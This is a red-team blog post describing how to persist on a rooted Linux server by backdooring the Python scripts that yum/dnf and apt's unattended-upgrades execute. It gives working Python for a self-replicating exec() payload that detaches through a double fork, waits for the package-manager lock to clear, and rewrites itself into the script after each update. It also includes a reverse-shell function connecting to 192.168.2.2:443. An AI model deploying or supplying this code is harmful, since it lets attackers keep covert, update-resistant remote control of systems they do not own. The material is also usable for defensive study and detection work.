---
layout: post
title:  "Persistence Via Linux Package Managers"
---

### *or* Backdooring Python Scripts for Fun and Profit

Imagine this scenario: You're a "Linux guy" on your Red Team, and you're preparing for a long-term exercise where you have to maintain access at all costs. You've managed to turn some exploit or guessable password into a root shell on a nice shiny Linux server. You want to use this for persistence, since you know its network egress traffic isn't monitored with the same attention as user machines. You think about simply adding a cron job, or another classic persistence location, but the Blue Team is already checking those. You find some promising service binaries that could be backdoored, but this is a **long** term exercise. The machine is set to update itself regularly, so any backdoored binaries or other critical system components are likely to be overwritten with the default versions.

Faced with this problem, an immediate consideration might be to backdoor the package manager itself. That way, after it updates the rest of the system, it can be leveraged to re-add the desired backdoor to another location, or simply re-execute another script or binary that will stay in memory. This might seem like a difficult task, until one realizes that the package managers on many Linux distributions have been built on a foundation of Python scripts for some time.

{: .center}
[![Hmmm](/assets/persistence/image.png)](/assets/persistence/image.png)

I know what people are immediately going to say: This sounds dangerous! Why mess around with something as important as system updates on a system that isn't yours? What if you break something? That's true, you shouldn't do this without explicit permission and thorough testing on the exact same OS. **But we don't learn to look for tricky things unless we figure out how to do tricky things and talk about them.**

### Exec Yourself Before You Wreck Yourself

We can add some code to a Python script that always runs when the package manager does its updates. But then, when the package manager updates itself, the backdoor code will only run once as the updates start. It will then be overwritten and never run again. We can solve this by adding a separate script file and modifying a legitimate script to add an import. The separate script could re-add the import after normal updates are complete. The only problem with this idea is: If anything goes wrong with the self-update and re-addition process, the additional file will be left behind and easily discoverable. We need a way to execute code that can re-add itself back to the same location; sort of a self-referencing, or self-replicating code block. The first tools that come to mind are Python multi-line strings and the exec() function.

{% highlight python %}
badVar = r'''
# some code here
'''
exec(badVar)
{% endhighlight %}

A multi-line string in Python can encapsulate new lines, etc. by using the triple quotes. This is convenient for containing a block of code in a string. exec() will then execute the string as code. However, the code needs to reference its own containing variable, because it needs to re-add the string back to its current script during its execution. This doesn't seem logically possible, because the variable "badVar" wouldn't logically exist inside the code block in the string. But as it turns out, the variable containing the string is in scope and accessible by the exec() function as it executes the code in the string. This is perfect to allow the code to reference itself. After the package manager updates itself and removes the extra code, it should be able to add itself back to the original script.

{% highlight python %}
badVar = r'''
#some code
badfile.write("\nbadVar = r\'''" + badVar + "\'''\nexec(badVar)\n")
#some more code
'''
exec(badVar)
{% endhighlight %}

Here, we have our triple quoted string containing a block of code, and then we have a string inside this code that duplicates the wrapping variable and exec. In order to reinsert the triple quoted string, we just have to escape one of the triple quotes to insert that character sequence, and then reference the variable itself as if it were in the code. We can then define functions and whatever else we want inside our code block.

{% highlight python %}
badVar = r'''
import sys,os
def bad():
    # some code
    with open('/tmp/badfile', 'r+') as badFile:
        if 'badVar' not in badFile.read():
            badFile.write("\nbadVar = r\'''" + badVar + "\'''\nexec(badVar)\n")
    return
bad()
'''
exec(badVar)
{% endhighlight %}

Sticking the above into a file by itself and running it, we can see that the target "badFile" contains the exact same code. If this was run repeatedly, it could continue to add itself back to itself, or other files. We almost have something like a self-replicating worm, it just doesn't do anything else yet.

{% highlight none %}
root@test:~# touch /tmp/badfile
root@test:~# cat /tmp/badfile
root@test:~# python badfile.py
root@test:~# cat /tmp/badfile

badVar = r'''
import sys,os
def bad():
    # some code
    with open('/tmp/badfile', 'r+') as badFile:
        if 'badVar' not in badFile.read():
            badFile.write("\nbadVar = r\'''" + badVar + "\'''\nexec(badVar)\n")
    return
bad()
'''
exec(badVar)
{% endhighlight %}

### Waiting Your Turn

Applying this to the actual backdoor concept requires some more thinking. When the package manager executes, our value-added code will run, but it first needs to wait for the package manager to finish updating itself before the re-addition. This seems impossible to achieve with certainty unless we create a separate process and wait for the original to finish. We could execute our "wait and then write file" function with subprocess.Popen(), but then we have another layer of quotes to place around everything as an argument, which is starting to become a nightmare. We also need this second process to continue execution when the parent process exits. We can do this with fork() and Popen(), but there is a more direct way. [(See also)](https://stackoverflow.com/questions/5772873/python-spawn-off-a-child-subprocess-detach-and-exit)

On Linux, what we're attempting is accomplished with a double-fork() and setsid(). This divorces the new process completely from the original, so that it won't exit when the original process does, and is free to perform its own functions without affecting the original. In Python, that looks something like this:

{% highlight python %}
try:
    pid = os.fork()
    if pid > 0:
        # parent can just return
        return
except Exception as e:
    return
# child process
try:
    # setsid and fork again
    os.setsid()
    pid2 = os.fork()
    if pid2 > 0:
        # second parent can just exit
        sys.exit(0)
    # here we are in the second child
    # add code here
except Exception as e:
    sys.exit(1)
{% endhighlight %}

First, we fork a new process, and the parent will just return. The child will fork again, and this new parent can just exit, while the second child, now completely separate from the original process, can do what we originally wanted to accomplish (re-add itself, re-install another backdoor, etc.). Now, if we're going to be responsible and not try to backdoor a server **forever**, we should first add a kill date to our code. After the pre-ordained date, the code should remove itself. Finally, to insert our original self-replicating function idea, we need to add code to wait for the legitimate process to complete, and then re-add itself to the original script on disk. Combining those concepts, we end up with something like this:

{% highlight python %}
thisFile = '/usr/lib/some/script'
killDay = '2020/10/01'

def timeToKill():
    dt = datetime.datetime.strptime(killDay,"%Y/%m/%d")
    if datetime.datetime.today() >= dt:
        return True
    return False

def remove():
    with open(thisFile, 'r+') as badFile:
        data = badFile.read()
        if 'badVar' in data:
            r = re.compile("\nbadVar.+exec\(badVar\)\n",re.DOTALL)
            data = re.sub(r, "", data)
            f.seek(0)
            f.write(data)
            f.truncate()

def writeBad():
    while True:
        try:
            # sleep for a while to be nice
            time.sleep(10)
            i = False
            # look for package manager pid/lock file
            for j, k, f in os.walk('/var',followlinks=True):
                if 'yum.pid' in f:
                    i = True
                    break
            # file is gone, we can add ourselves back
            if not i:
                with open(thisFile, 'r+') as badFile:
                    if 'badVar' not in badFile.read():
                        badFile.write("\nbadVar = r\'''"+badVar+"\'''\nexec(badVar)\n")
                # now we are done
                return
        except Exception as e:
            sys.exit(1)

def bad():
    # if we are after kill date,
    # remove ourselves and return
    if timeToKill():
        remove()
        return
    # if not, go ahead
    try:
        pid = os.fork()
        if pid > 0:
            # parent can just return
            return
    except Exception as e:
        return
    # child process
    try:
        # setsid and fork again
        os.setsid()
        pid2 = os.fork()
        if pid2 > 0:
            # second parent can just exit
            sys.exit(0)
        # second child wait to re-persist
        writeBad()
    except Exception as e:
        sys.exit(1)    

bad()
{% endhighlight %}

In our new script, we double fork and then our new process waits for the package manager's lock/pid file to disappear. Then, it re-adds itself to the original location. This should ensure that after the script is overwritten by the updater, our code goes right back where we want it. For simplicity, we're just adding our block to the end of the script. The nice thing about Python is that this will run even if it's added to a library script that is normally just imported by something else.

### From Concept to PoC

There are still some problems with this code as it stands. We may get an error because we're importing new libraries after the original import in the Python script we've modified. To fix that, we can call imp.acquire_lock() when we spawn a new thread. In addition, in order to ensure the script works on systems with different package managers, the correct location for the pid/lock file should be substituted.

Finally, we probably want our backdoor to actually do something. We could have it overwrite a legitimate binary with one that we download or store somewhere else, or persist a fully-featured backdoor in some other script. We can essentially modify anything that is package-managed now without fear of losing our modifications. To demonstrate that it works, we'll just add a few lines that spawn a shell connection to a remote server. We can do this in multiple places in the code, including the first forked process/second parent before it exits. One caveat is to avoid zombie processes (showing up as "defunct" or similar in the process list) we want to ignore SIGCHLD in our second parent process before spawning a shell. Doing this in the first parent may sometimes break things in the package manager if it calls waitpid() elsewhere, so it's best to only do it in our own spawned process.

{% highlight python %}
def connect():
    r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    r.connect(('192.168.2.2',443))
    os.dup2(r.fileno(),0)
    os.dup2(r.fileno(),1)
    os.dup2(r.fileno(),2)
    pty.spawn('/bin/bash')
    r.close()

# snip

def bad():
    if timeToKill():
        remove()
        return
    try:
        pid = os.fork()
        imp.acquire_lock()
        if pid > 0:
            return
    except Exception as e:
        return
    try:
        os.setsid()
        pid2 = os.fork()
        imp.acquire_lock()
        if pid2 > 0:
            # avoid zombies
            signal.signal(signal.SIGCHLD, signal.SIG_IGN)
            # execute a shell here, then exit
            connect()
            sys.exit(0)
        # second child persists
        writeBad()
    except Exception as e:
        sys.exit(1)

bad()
{% endhighlight %}

The connect() here is only added in this place to demonstrate how the processes look as the script is running. Here it is working with minimal changes on a RHEL 8.2 server using yum/dnf. We can see the spawned process that waits for the updates to finish, and the process spawning the callback shell. We can also see the persistence code disappear from the modified python script as it is updated, and then reappear after the updates complete. A subsequent update proves that the code works again, ad infinitum. This was on a stock OS image; no changes were made to this system before the recording.

{: .center}
[![yum asciicast](https://asciinema.org/a/ieDU7u4hd9LCXeK0g2tyOFx66.svg)](https://asciinema.org/a/ieDU7u4hd9LCXeK0g2tyOFx66)

### Add APT Ability

We can improve this further to allow it to run better on different distributions. To properly execute on any system without a lot of new processes appearing strangely, we should realistically place our connect() or whatever other code we want **during or after** the persistence step. If we're adding another backdoor somewhere else instead of just executing a shell, that's how we would ensure it gets added at the correct time. We can demonstrate that by simply moving the call to connect() right after the call to writeBad(). We also don't need to ignore SIGCHLD if the second parent just exits. In addition, on modern systems using apt in particular, we can't just check for the existence of a pid/lock file to determine if the package manager is still running. The following code should replace the simple file check with a check for an actual lock on the lock file, which always exists. [(See also)](https://serverfault.com/questions/221871/how-do-i-check-to-see-if-an-apt-lock-file-is-locked)

{% highlight python %}
with open('/var/lib/dpkg/lock', 'w') as lck:
     try:
         fcntl.lockf(lck, fcntl.LOCK_EX | fcntl.LOCK_NB)
         i = False
     except IOError:
         i = True
{% endhighlight %}

Here's what it looks like when we value-add an Ubuntu 20.04 server using apt/dpkg with unattended upgrades enabled. The unattended upgrades normally run from a cron job when enabled, but the same command can just be executed manually to demonstrate. The only changes to the system were to downgrade the "python3-apt" package (basically a version number change only) and enable regular updates to be installed unattended, to create the worst case scenario for persistence.

{: .center}
[![apt asciicast](https://asciinema.org/a/jpQVELgcOh5DcOY1mgemf7s8i.svg)](https://asciinema.org/a/jpQVELgcOh5DcOY1mgemf7s8i)

There are some caveats to the apt situation. Older systems using apt worked similarly to the yum example, but running a manual "apt upgrade" on a modern system will not launch any python scripts to accomplish its tasks until after the upgrades are complete. This means our code wouldn't execute before it is overwritten by a potential update to its own script. It could still work for whatever other task it accomplishes, but it wouldn't persist through updates to the python script. However, the unattended-upgrades package, enabled on modern servers as the correct way to automatically install critical updates, does use the python libraries. Hence, the above example.

It is a little trickier to catch the changes as they are happening, because the python scripts are run **for each package being updated**. Our code will run multiple times if multiple packages are updated, but will return gracefully each time, and will re-add itself as soon as the apt lock expires for the package containing its script.

The same techniques work on older servers, including those machines still using Python 2, but will require some tweaking (actually, that's why the first conceptual code samples above reference yum.pid, although it isn't used on newer systems).

